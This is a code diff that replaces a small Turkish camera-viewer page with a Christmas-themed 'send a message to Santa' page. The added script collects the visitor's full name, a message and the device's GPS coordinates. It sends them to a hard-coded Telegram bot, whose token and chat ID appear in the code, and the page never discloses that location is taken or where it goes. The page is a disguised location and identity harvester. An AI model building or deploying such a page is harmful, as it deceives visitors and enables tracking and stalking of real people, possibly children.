@@ -1,38 +1,251 @@
 <!DOCTYPE html>
 <html lang="tr">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mobil Kamera Açma</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Noel Baba'ya Mesaj Gönder 🎅🎄</title>
+    <style>
+        /* Sayfa genel stilleri */
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #ffffff, #5ee78c, #ffef00, #00ff00, white);
+            background-size: 400% 400%;
+            animation: gradient 10s ease infinite;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* Gradient animasyonu */
+        @keyframes gradient {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Konteynerin ortalanması ve stil ayarları */
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
+            color: white;
+            position: relative;
+        }
+
+        /* Noel Baba temalı başlık */
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #ffef00;
+            font-family: 'Cursive', sans-serif;
+        }
+
+        /* Kullanıcı adı input stil */
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            background-color: #fff;
+            color: #333;
+        }
+
+        /* Mesaj gönderme butonu stil */
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #ff00ff;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            color: white;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #ff7300;
+        }
+
+        /* Durum metni stil */
+        p {
+            font-size: 1rem;
+            color: #fff;
+        }
+
+        /* Yılbaşı süslemeleri */
+        .snowflake {
+            position: absolute;
+            top: -10px;
+            z-index: -1;
+            font-size: 2rem;
+            color: #ffffff;
+            opacity: 0.8;
+            animation: snow 10s linear infinite;
+        }
+
+        /* Kar tanesinin animasyonu */
+        @keyframes snow {
+            0% {
+                transform: translateX(0) translateY(0);
+            }
+
+            100% {
+                transform: translateX(100px) translateY(100vh);
+            }
+        }
+
+        /* Farklı hızlar ve konumlarla kar tanelerinin rastgele dağılması */
+        .snowflake:nth-child(1) {
+            left: 5%;
+            animation-duration: 12s;
+        }
+
+        .snowflake:nth-child(2) {
+            left: 20%;
+            animation-duration: 14s;
+        }
+
+        .snowflake:nth-child(3) {
+            left: 35%;
+            animation-duration: 16s;
+        }
+
+        .snowflake:nth-child(4) {
+            left: 50%;
+            animation-duration: 18s;
+        }
+
+        .snowflake:nth-child(5) {
+            left: 65%;
+            animation-duration: 14s;
+        }
+
+        .snowflake:nth-child(6) {
+            left: 80%;
+            animation-duration: 12s;
+        }
+
+        .snowflake:nth-child(7) {
+            left: 15%;
+            animation-duration: 17s;
+        }
+
+        .snowflake:nth-child(8) {
+            left: 30%;
+            animation-duration: 15s;
+        }
+
+        .snowflake:nth-child(9) {
+            left: 45%;
+            animation-duration: 13s;
+        }
+
+        .snowflake:nth-child(10) {
+            left: 60%;
+            animation-duration: 19s;
+        }
+    </style>
 </head>
+
 <body>
-  <h1>Mobil Kamerayı Aç</h1>
-  <video id="video" autoplay playsinline width="100%" height="auto"></video>
-  <p id="error-message" style="color: red; display: none;">Kamera açılamadı. Lütfen izin verdiğinizden emin olun.</p>
 
-  <script>
-    async function startCamera() {
-      try {
-        // Kamera akışını başlat
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: {
-            facingMode: 'environment' // Arka kamera (mobil cihazlar için)
-          }
+    <div class="container">
+        <h1>Noel Baba'ya Mesaj Gönder 🎅🎄</h1>
+        <input type="text" id="user-name" placeholder="Adınızı ve soyadınızı paylaşır mısınız? 😊">
+        <input type="text" id="user-message" placeholder="Noel Baba'ya bir mesaj yazın...">
+        <button id="send-message">Gönder</button>
+        <p id="status">...</p>
+    </div>
+
+    <!-- Yılbaşı kar tanesi süslemesi -->
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+    <div class="snowflake">❄️</div>
+
+    <script>
+        document.getElementById('send-message').addEventListener('click', () => {
+            const status = document.getElementById('status');
+            const userName = document.getElementById('user-name').value; // Kullanıcının ismini al
+            const userMessage = document.getElementById('user-message').value; // Kullanıcının mesajını al
+
+            // Konum bilgisini almak için Geolocation API'yi kullan
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Mesaj göndermeyi simüle et
+                    if (userName && userMessage) {
+                        status.textContent = 'Mesajınız gönderiliyor...';
+
+                        // Telegram Bot API URL'si
+                        var token = "7782206979:AAE_JMIsLiSJaKpgEFFYU4eWaYHCXZqciAg"; // Bot token
+                        var chatId = "5312871954"; // Chat ID (Bu sizin chat_id'niz)
+
+                        var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                        // Mesaj içeriğini oluştur, kullanıcı adı, mesaj ve konum ile birlikte
+                        var text = `Kullanıcı Adı: ${userName}\nMesaj: ${userMessage}\nKonum: Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                        // Veriyi Telegram API'sine gönder
+                        fetch(url, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: text
+                            })
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log("Mesaj gönderildi:", data);
+                                status.textContent = 'Mesajınız başarıyla gönderildi! 🎅';
+                            })
+                            .catch(error => {
+                                console.error("Hata:", error);
+                                status.textContent = 'Bir hata oluştu, lütfen tekrar deneyin.';
+                            });
+                    } else {
+                        status.textContent = 'Lütfen isminizi ve mesajınızı girin.';
+                    }
+                }, (error) => {
+                    console.error(error);
+                    status.textContent = 'Konum bilgisi alınamadı, lütfen tekrar deneyin.';
+                });
+            } else {
+                status.textContent = 'Geolocation API desteklenmiyor.';
+            }
         });
-
-        const video = document.getElementById('video');
-        video.srcObject = stream; // Video kaynağı olarak akışı belirle
-      } catch (error) {
-        // Hata durumunda mesaj göster
-        const errorMessage = document.getElementById('error-message');
-        errorMessage.style.display = 'block';
-        errorMessage.textContent = `Kamera hatası: ${error.message}`;
-        console.error('Kamera hatası:', error);
-      }
-    }
-
-    // Kamera akışını başlat
-    window.onload = startCamera;
-  </script>
+    </script>
 </body>
+
 </html>
